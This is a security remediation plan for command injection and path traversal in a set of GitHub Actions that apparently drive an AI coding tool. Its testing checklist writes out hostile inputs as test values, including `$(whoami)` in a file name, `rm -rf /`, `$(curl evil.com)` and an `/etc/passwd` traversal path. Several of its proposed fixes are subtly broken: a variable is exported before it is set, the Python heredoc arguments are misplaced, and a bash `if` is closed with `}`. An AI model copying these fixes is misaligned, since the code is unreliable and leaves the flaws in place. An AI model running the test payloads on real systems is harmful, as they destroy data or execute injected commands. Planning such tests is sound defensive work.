# Security Fix Plan

**Date**: 2026-01-30
**Status**: CRITICAL - Immediate Action Required
**Priority**: P0 - Stop Production Use Until Fixed

---

## Executive Summary

The code review identified **10 security and code quality issues** ranging from CRITICAL to MEDIUM severity. The most critical are command injection vulnerabilities via `sed` that could lead to arbitrary code execution on self-hosted runners.

**Immediate Actions Required**:
1. ⛔ **STOP** using these actions in production until fixes are deployed
2. 🔒 **Restrict** self-hosted runner access to isolated environments
3. 🔄 **Rotate** all secrets that may have been exposed to runners
4. 🛠️ **Implement** fixes using this plan

---

## Critical Vulnerabilities (Command Injection)

### Issue #1: action-fixer (CRITICAL)
**File**: `actions/action-fixer/action.yml:107-110`
**Attack Vector**: File names and content with `#` or `$()` characters

**Current Code**:
```yaml
CURRENT_CONTENT=$(cat "$file")
FIX_PROMPT=$(sed -e "s#{FILE}#$file#g" \
                  -e "s#{ISSUES}#$ISSUES#g" \
                  -e "s#{CURRENT_CONTENT}#$CURRENT_CONTENT#g" \
                  "$TEMPLATE_FILE")
```

**Fix Strategy**:
```yaml
# Option 1: Use envsubst (requires variable export)
export FILE="$file"
export ISSUES="$ISSUES"
export CURRENT_CONTENT
CURRENT_CONTENT=$(cat "$file")
FIX_PROMPT=$(envsubst < "$TEMPLATE_FILE")

# Option 2: Escape sed special chars
escape_sed() {
  printf '%s' "$1" | sed 's/[\/&.*^$+?{|()[]/\\&/g'
}
SAFE_FILE=$(escape_sed "$file")
SAFE_ISSUES=$(escape_sed "$ISSUES")
SAFE_CONTENT=$(escape_sed "$CURRENT_CONTENT")
FIX_PROMPT=$(sed -e "s#{FILE}#$SAFE_FILE#g" \
                  -e "s#{ISSUES}#$SAFE_ISSUES#g" \
                  -e "s#{CURRENT_CONTENT}#$SAFE_CONTENT#g" \
                  "$TEMPLATE_FILE")

# Option 3: Use Python (RECOMMENDED for complex content)
python3 << 'PYTHON'
import sys
template = open(sys.argv[1]).read()
file_content = open(sys.argv[2]).read()
result = template.replace("{FILE}", sys.argv[2]) \
                 .replace("{CURRENT_CONTENT}", file_content)
print(result)
PYTHON "$TEMPLATE_FILE" "$file"
```

### Issue #2: spec-to-code (CRITICAL)
**File**: `actions/spec-to-code/action.yml:60-63`
**Attack Vector**: Specification file content with malicious commands

**Fix**: Same as Issue #1, use Python or envsubst

### Issue #3: auto-document (CRITICAL)
**File**: `actions/auto-document/action.yml:45-47`
**Attack Vector**: Path traversal + command injection

**Fix Strategy**:
```yaml
# Validate paths are within workspace
validate_path() {
  local path="$1"
  local resolved
  resolved=$(realpath "$path" 2>/dev/null) || {
    echo "::error::Invalid path: $path"
    exit 1
  }
  if [[ "$resolved" != "$GITHUB_WORKSPACE"* ]]; then
    echo "::error::Path outside workspace: $path"
    exit 1
  }
  echo "$resolved"
}

SOURCE_PATH=$(validate_path "$SOURCE_PATH")
DOC_PATH=$(validate_path "$DOC_PATH")
```

### Issue #4: auto-refactor (CRITICAL)
**File**: `actions/auto-refactor/action.yml:48-50`
**Attack Vector**: User-provided instruction input

**Fix**: Append instruction directly instead of substitution:
```yaml
REFACTOR_PROMPT=$(sed "s#{TARGET_PATH}#$TARGET_PATH#g" "$TEMPLATE_FILE")
echo "" >> /tmp/prompt.txt
echo "INSTRUCTION:" >> /tmp/prompt.txt
echo "$INSTRUCTION" >> /tmp/prompt.txt
```

### Issue #5: release-notes-ai (CRITICAL)
**File**: `actions/release-notes-ai/action.yml:54-57`
**Attack Vector**: Commit messages in git log

**Fix**: Use Python for safe handling:
```yaml
python3 << 'PYTHON'
import json, sys
data = {
  "GIT_LOG": open("/tmp/git_log.txt").read(),
  "PRS": open("/tmp/prs.txt").read(),
  "OUTPUT": sys.argv[1]
}
template = open(sys.argv[2]).read()
for key, value in data.items():
  template = template.replace(f"{{{key}}}", value)
print(template)
PYTHON "$OUTPUT" "$TEMPLATE_FILE" > /tmp/release_prompt.txt
```

---

## High Priority Issues

### Issue #6: Missing Error Handling
**Files**: All action.yml files
**Fix**: Add `set -euo pipefail` to every run block

```yaml
run: |
  set -euo pipefail  # Exit on error, undefined vars, pipe failures

  # existing code
```

### Issue #7: Example Runner Configuration
**Status**: ✅ FIXED - Already corrected in this commit

### Issue #8: auto-rebase set +e
**File**: `actions/auto-rebase/action.yml:89`
**Fix**: Capture exit code explicitly instead of disabling error checking

---

## Implementation Plan

### Phase 1: Create Security Utilities (Immediate)
1. Create `.helpers/scripts/security.sh` with:
   - `escape_sed_input()` - Escape special characters for sed
   - `validate_path_in_workspace()` - Prevent path traversal
   - `safe_json_parse()` - Use jq instead of grep

2. Update CLAUDE.md to document:
   - All new actions MUST use security utilities
   - Never use sed with user input directly
   - Always validate paths

### Phase 2: Fix Critical Vulnerabilities (Week 1)
Priority order:
1. action-fixer (most widely used)
2. spec-to-code (user input)
3. auto-document (path traversal)
4. auto-refactor (user input)
5. release-notes-ai (git log injection)

For each action:
1. Add `set -euo pipefail`
2. Replace unsafe sed with security utilities or Python
3. Add input validation
4. Add tests for injection attempts
5. Update documentation

### Phase 3: Fix High Priority Issues (Week 2)
1. Add error handling to remaining actions
2. Fix auto-rebase error handling
3. Add security scanning to CI

### Phase 4: Testing & Validation (Week 3)
1. Create security test suite
2. Test each fix with malicious inputs:
   - File names with `#`, `$()`, backticks
   - Paths with `../../`
   - Content with command injection
3. Verify all existing functionality still works

---

## Security Testing Checklist

For each fixed action, test with:
- [ ] File name: `test$(whoami).yml`
- [ ] File name: `test# && evil #.yml`
- [ ] Path: `../../../../etc/passwd`
- [ ] Instruction: `do work && rm -rf /`
- [ ] Commit message: `feat: $(curl evil.com)`
- [ ] Spec content: `$(malicious command)`
- [ ] JSON with newlines in summary field

---

## Rollback Plan

If fixes break existing functionality:
1. Revert to previous version
2. Add warning to action.yml description
3. Document security risk in README
4. Restrict action usage to trusted repositories only

---

## Success Criteria

- [ ] All 5 critical vulnerabilities fixed
- [ ] All tests pass with malicious inputs
- [ ] No regressions in existing functionality
- [ ] Security scanning added to CI
- [ ] Documentation updated with security guidelines
- [ ] All actions use `set -euo pipefail`

---

## Additional Recommendations

1. **Add Security Policy**: Create `SECURITY.md` with:
   - How to report vulnerabilities
   - Security update process
   - Version compatibility

2. **Add Dependabot**: For GitHub Actions dependency updates

3. **Add CodeQL**: For static analysis of security issues

4. **Document Runner Requirements**: Create matrix showing which actions require self-hosted runners and why

5. **Consider Migration**: For complex actions, migrate from bash to Python for better security

---

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Shell Script Best Practices](https://github.com/ianthehenry/sbp)

---

**Next Steps**: Assign owner for each phase, create tracking issues, begin Phase 1 immediately.
